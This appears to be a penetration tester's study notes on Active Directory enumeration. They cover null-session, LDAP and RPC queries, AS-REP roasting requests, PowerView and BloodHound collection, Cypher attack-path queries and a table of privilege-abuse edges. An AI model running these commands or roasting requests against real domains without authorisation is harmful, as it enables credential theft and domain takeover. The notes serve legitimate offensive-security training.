# Active Directory Reconnaissance & Enumeration

## Overview

Enumeration is the most critical phase in AD exploitation. The deeper the enum, the more attack paths you find.

---

## No Credentials

### LDAP Anonymous Bind

```powershell
# Check if LDAP anonymous bind is allowed
ldapsearch -H ldap://<DC-IP> -x -b "DC=<domain>,DC=<local>" -s base ""
ldapsearch -H ldap://<DC-IP> -x -b "DC=<domain>,DC=<local>" "(objectClass=*)"
```

### SMB Null Session

```bash
# Check for null session access
net use \\\\<DC-IP>\\IPC$ "" /u:""
smbclient -L //<DC-IP> -N
crackmapexec smb <DC-IP> -u '' -p ''
```

### enum4linux

```bash
# Full enum
enum4linux -a <DC-IP>

# Targeted queries
enum4linux -U <DC-IP>        # List users
enum4linux -G <DC-IP>        # List groups
enum4linux -S <DC-IP>        # List shares
enum4linux -P <DC-IP>        # Password policy
enum4linux -r -u "" -p "" <DC-IP>
```

### AS-REP Roasting

```bash
# Enumerate users without Kerberos pre-authentication
impacket-GetNPUsers <domain>/ -dc-ip <DC-IP> -usersfile <userlist.txt>

# With creds, find all AS-REP roastable users
impacket-GetNPUsers <domain>/<user>:<password> -dc-ip <DC-IP> -request
```

### CrackMapExec

```bash
# Null session user enumeration
crackmapexec smb <DC-IP> -u '' -p '' --users

# Enumerate shares
crackmapexec smb <DC-IP> -u '' -p '' --shares

# Password policy
crackmapexec smb <DC-IP> -u '' -p '' --pass-pol
```

### DNS Enumeration

```bash
# Zone transfer attempt
dig axfr @<DC-IP> <domain>
nslookup -type=any <domain> <DC-IP>

# DNS subdomain brute force ([[AD Attack Vectors]])
dnsrecon -d <domain> -t axfr -n <DC-IP>
```

### Unauthenticated SMB RPC Enumeration

```bash
# RPC null session
rpcclient -U "" -N <DC-IP>
rpcclient $> enumdomusers
rpcclient $> enumdomgroups
rpcclient $> querydominfo
rpcclient $> enumprivs
rpcclient $> netshareenum
rpcclient $> getdompwinfo
```

---

## With Credentials

### PowerView (PowerShell)

```powershell
# Load PowerView
. .\\PowerView.ps1

# Basic domain info
Get-NetDomain
Get-NetDomainController

# User enumeration
Get-NetUser
Get-NetUser -Username <username>
Get-NetUser | select samaccountname, description, pwdlastset, badpwdcount, memberof
Get-NetUser -LDAPFilter "(description=*)"

# Group enumeration
Get-NetGroup
Get-NetGroup -GroupName "Domain Admins"
Get-NetGroupMember "Domain Admins"

# Computer enumeration
Get-NetComputer
Get-NetComputer -OperatingSystem "*Server*"
Get-NetComputer -Ping

# Share enumeration
Get-NetShare
Find-InterestingDomainShareFile

# GPO enumeration
Get-NetGPO
Get-NetGPO -ComputerIdentity <computer>
Get-NetGPOGroup           # Find local group membership via GPO

# OU enumeration
Get-NetOU

# ACL enumeration
Get-ObjectAcl -ResolveGUIDs -SamAccountName <user>
Get-ObjectAcl -ResolveGUIDs -SamAccountName "Domain Admins"

# Domain trust
Get-NetDomainTrust
Get-NetForestTrust

# User hunting
Find-LocalAdminAccess
Get-NetSession -ComputerName <target>
Get-NetLoggedon -ComputerName <target>
```

### ADModule (RSAT AD PowerShell)

```powershell
# Load AD Module
Import-Module ActiveDirectory

# Users
Get-ADUser -Filter * -Properties *
Get-ADUser -Identity <username> -Properties *

# Groups
Get-ADGroup -Filter *
Get-ADGroupMember "Domain Admins"

# Computers
Get-ADComputer -Filter *

# Password policy
Get-ADDefaultDomainPasswordPolicy

# ACLs
Get-ADObject -Identity "CN=<User>,CN=Users,DC=<domain>,DC=<local>" -Properties *

# GPO
Get-ADOrganizationalUnit -Filter * -Properties *

# Fine-grained password policies
Get-ADFineGrainedPasswordPolicy
Get-ADFineGrainedPasswordPolicySubject <policy>
```

---

## BloodHound

### Collection (SharpHound)

```powershell
# Collect all data
SharpHound.exe -c All --zipfilename <output>

# Specific collection methods
SharpHound.exe -c Group,LocalAdmin,Session,ACL,Trusts,DCOM,RDP,PSRemote,WinRM,LoggedOn,Container

# Run from memory with execute-assembly
execute-assembly /path/SharpHound.exe -c All

# Linux collector (Python)
bloodhound-python -d <domain> -u <user> -p <password> -dc <DC-IP> -c All

# Restart-need for Linux collector
-need to rerun to get sessions.
```

### Neo4j Setup

```bash
# Start neo4j
sudo neo4j console

# Default creds
neo4j:neo4j

# Then start BloodHound GUI
bloodhound
```

### Key BloodHound Queries

#### Built-in Queries

| Query | Purpose |
|-------|---------|
| Find all Domain Admins | List all DA members |
| Find Computers with Unsupported OS | Legacy/outdated targets |
| Find Computers where Domain Users are Local Admin | Pivoting targets |
| Shortest Paths to Domain Admins | Attack path analysis |
| Shortest Paths to High-Value Targets | Key targets |
| Kerberoastable Users | [[Kerberoasting]] candidates |
| AS-REP Roastable Users | [[AS-REP Roasting]] candidates |
| Users with Most Privileges | High-risk accounts |

#### Cypher Queries (Custom)

```cypher
// All domain admins
MATCH (g:Group) WHERE g.name =~ "DOMAIN ADMINS@.*" RETURN g

// All computers with unconstrained delegation
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c

// Kerberoastable users
MATCH (u:User {hasspn:true}) RETURN u

// AS-REP roastable users
MATCH (u:User {dontreqpreauth:true}) RETURN u

// Shortest paths to DA
MATCH p = shortestPath((n)-[*1..]->(m:Group {name:"DOMAIN ADMINS@<DOMAIN>"})) RETURN p

// Users with AdminCount=1 (protected by [[AdminSDHolder]])
MATCH (u:User {admincount:true}) RETURN u

// ACL abuse paths
MATCH p = (n)-[r:GenericAll|WriteOwner|WriteDACL|GenericWrite|ForceChangePassword]->(m) RETURN p

// Computers with sessions as high-value users
MATCH (u:User)-[:HasSession]->(c:Computer) WHERE u.admincount = true RETURN c, u

// Find group nesting paths
MATCH p = (g:Group)-[:MemberOf*1..]->(m:Group {name:"DOMAIN ADMINS@<DOMAIN>"}) RETURN p
```

### BloodHound Edge Abuse

| Edge | Abuse Technique |
|------|----------------|
| `MemberOf` | Group membership enumeration |
| `HasSession` | Token impersonation, [[Pass-the-Hash]] |
| `AdminTo` | Local admin ([[WMI]], [[WinRM]], [[PsExec]]) |
| `AllExtendedRights` | [[DCSync]], full object control |
| `AddMember` | Add user to privileged group |
| `ForceChangePassword` | [[ACL Abuse]] |
| `GenericAll` | Full control, [[ACL Abuse]] |
| `GenericWrite` | Write properties (SPN for [[Kerberoasting]]) |
| `WriteOwner` | [[ACL Abuse]] |
| `WriteDACL` | [[ACL Abuse]] |
| `CanRDP` | RDP access |
| `DCSync` | [[DCSync]] attack |
| `GetChanges` | Replication rights ([[DCSync]] precursor) |
| `SIDHistory` | [[SID History injection]] |

---

## Related Notes

- [[AD Attack Vectors]]
- [[AD Lateral Movement]]
- [[AD ACL Abuse]]
- [[AD Domain Dominance]]
- [[Windows Post Exploitation]]
